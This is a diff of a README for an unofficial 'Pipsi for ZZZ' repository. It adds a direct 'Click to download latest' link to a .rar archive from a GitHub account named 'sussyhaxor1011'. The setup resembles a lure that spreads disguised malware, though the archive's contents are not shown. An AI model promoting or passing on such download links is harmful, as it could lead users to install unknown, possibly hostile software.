@@ -1,4 +1,2 @@
-# zzz
-Pipsi for ZZZ (Unofficial repository)
-
-Not owned by Z4ee
+# Pipsi for ZZZ (Unofficial Repository) - Not owned by Z4ee
+[Click to download latest](https://github.com/sussyhaxor1011/zzz/releases/latest/download/x64.rar)
